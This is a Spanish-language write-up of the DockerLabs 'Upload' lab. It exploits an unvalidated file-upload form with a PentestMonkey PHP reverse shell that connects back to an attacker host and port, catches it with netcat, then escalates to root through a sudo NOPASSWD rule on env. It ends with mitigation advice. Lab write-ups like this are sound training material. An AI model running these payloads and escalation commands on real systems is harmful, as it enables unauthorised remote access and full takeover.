# Upload (DockerLabs) — Writeup

Dificultad: muy fácil

Hay retos que se esconden detrás de capas de ofuscación y otros que directamente te dicen en la portada lo que vas a hacer. Esta máquina pertenece claramente al segundo grupo: la web se llama, literalmente, "sube aquí tu archivo". No hace falta ser un genio del reconocimiento para intuir por dónde va el ataque — el reto real está en confirmar que, efectivamente, no hay ninguna validación detrás de esa invitación tan directa.

IP de laboratorio: `172.17.0.2`

---

## Planteamiento

Todo el recorrido cabe en dos ideas: primero, un formulario de subida de archivos que acepta cualquier cosa sin comprobar nada, alojado en un directorio que además es públicamente accesible y ejecuta lo que se le suba. Segundo, una vez dentro como usuario del servidor web, un permiso de sudo sobre `env` — un binario tan aparentemente inocuo como "establecer variables de entorno" — que resulta ser una vía directa y sin fricción hacia root.

---

## Paso 0: el objetivo responde

```bash
ping -c 4 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.042 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.049 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.044 ms
64 bytes from 172.17.0.2: icmp_seq=4 ttl=64 time=0.043 ms
4 packets transmitted, 4 received, 0% packet loss
```

TTL 64, Linux confirmado.

---

## Paso 1: escaneo de puertos

```bash
nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn -oN escaneo.txt -vvv 172.17.0.2
```

| Puerto | Estado | Servicio | Versión |
|---|---|---|---|
| 80/tcp | abierto | HTTP | Apache httpd 2.4.52 (Ubuntu) |

Un único puerto, y el título de la página que devuelve Nmap ya adelanta el vector de ataque: "Upload here your file". Difícil ser más explícito.

---

## Paso 2: confirmando qué hay detrás del formulario

Visitando la página principal aparece, en efecto, un formulario de subida de archivos sin ningún filtro visible a simple vista. Antes de lanzar cualquier payload, conviene averiguar dónde termina yendo a parar lo que se sube — porque un formulario de subida sin un destino público accesible no serviría de mucho para conseguir ejecución remota.

```bash
ffuf -w DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -u http://172.17.0.2/FUZZ \
  -r -recursion -t 200 -e .php,.html
```

```
uploads   [Status: 200, Size: 1132]
```

Ahí está: un directorio `/uploads` accesible directamente desde el navegador.

```bash
curl -L http://172.17.0.2/uploads
```

El listado de directorio de Apache confirma que ahí se almacenan los archivos subidos, y lo más importante: al estar dentro de la raíz web servida por Apache con soporte PHP activo, cualquier script `.php` que aterrice ahí **se ejecuta** al ser solicitado, no se descarga como archivo estático. Con esa confirmación, el plan está claro: subir una reverse shell en PHP y visitarla desde el navegador para dispararla.

---

## Paso 3: preparar y subir la reverse shell

Se genera un script PHP de reverse shell (la variante PentestMonkey, disponible también a través de generadores como revshells.com), ajustando IP y puerto de la máquina atacante:

```php
<?php
set_time_limit(0);
$ip = '172.17.0.1';
$port = 4343;
$shell = 'uname -a; w; id; /bin/bash -i';
// ... resto del script de reverse shell
?>
```

El script, en esencia, hace tres cosas: abre una conexión TCP hacia la IP y puerto indicados, lanza un proceso `bash`, y conecta la entrada, salida y error estándar de ese proceso directamente al socket de red — el mecanismo estándar detrás de cualquier reverse shell simple.

El archivo se sube tal cual a través del formulario web, quedando disponible en `/uploads/hi.php`. Ninguna validación de tipo, extensión o contenido lo intercepta por el camino.

---

## Paso 4: disparar la ejecución

Se levanta el listener en la máquina atacante:

```bash
nc -lvnp 4343
```

Y desde otra terminal, simplemente se solicita el archivo recién subido:

```bash
curl http://172.17.0.2/uploads/hi.php
```

Apache interpreta el script como PHP normal y lo ejecuta con los privilegios del propio servidor web. La conexión llega al listener casi de inmediato:

```
Connection received on 172.17.0.2 48208
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@a07e665cd18f:/$
```

Acceso conseguido como `www-data`, el usuario habitual con el que corre Apache en instalaciones por defecto.

---

## Paso 5: qué puede hacer www-data con sudo

```bash
sudo -l
```

```
User www-data may run the following commands on a07e665cd18f:
    (root) NOPASSWD: /usr/bin/env
```

A simple vista, `env` parece de los binarios más inofensivos del sistema — su propósito habitual es mostrar o modificar variables de entorno antes de ejecutar un programa. Pero ahí está justo el problema: `env` puede recibir como argumento **el propio programa a ejecutar**, y lo lanza heredando el entorno (y los privilegios) del proceso que invocó a `env`. Si ese proceso corre como root vía sudo, cualquier programa que `env` lance también corre como root.

```bash
sudo env /bin/sh
```

```
id
uid=0(root) gid=0(root) groups=0(root)

whoami
root
```

Root obtenido en una sola línea, sin ninguna otra técnica adicional.

Para dejar la sesión cómoda antes de seguir trabajando:

```bash
script /dev/null -c bash
```

```
root@a07e665cd18f:/# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Resumen técnico

| Campo | Valor |
|---|---|
| Vector inicial | Formulario de subida sin validación |
| Payload | Reverse shell PHP (PentestMonkey) |
| Directorio de subida | `/uploads` (público y ejecutable) |
| Usuario obtenido | www-data |
| Vector de escalada | `sudo env /bin/sh` |
| Resultado final | root directo, sin contraseña |

---

## Qué falló aquí (y cómo se evita)

1. **Subida de archivos sin ninguna validación de tipo, extensión o contenido.** Aceptar cualquier archivo tal cual llega, sin comprobar extensión permitida, tipo MIME real ni contenido del propio archivo, es de las vulnerabilidades más directas y peligrosas que puede tener una aplicación web. La corrección pasa por validar por lista blanca y, aún mejor, analizar el contenido real del archivo antes de aceptarlo.
2. **Directorio de subidas dentro de la raíz web y con capacidad de ejecución.** Ningún directorio destinado a almacenar archivos subidos por usuarios debería permitir que esos archivos se ejecuten como código. La forma correcta es almacenar las subidas fuera de la raíz servida por el servidor web, o como mínimo desactivar explícitamente la ejecución de scripts dentro de esa carpeta concreta a nivel de configuración del servidor.
3. **Permiso de sudo NOPASSWD sobre `env`.** Cualquier binario capaz de lanzar otro programa —como `env`, `find`, `awk` o decenas más catalogados en GTFOBins— equivale a una vía de escalada directa si se concede sin restricciones a través de sudo. La regla general debería ser: antes de otorgar cualquier permiso de sudo, comprobar en GTFOBins si ese binario permite escapar a una shell.
4. **Servicio web corriendo con capacidad de escalar a root con una sola línea.** El principio de mínimo privilegio implica que el usuario bajo el que corre Apache no debería tener, bajo ninguna circunstancia, un camino tan corto hacia privilegios de administrador.

---

## Referencias

- GTFOBins — env: https://gtfobins.github.io/gtfobins/env/
- OWASP — Unrestricted File Upload: https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- revshells.com: https://www.revshells.com/
- ffuf: https://github.com/ffuf/ffuf
- DockerLabs: https://dockerlabs.es/
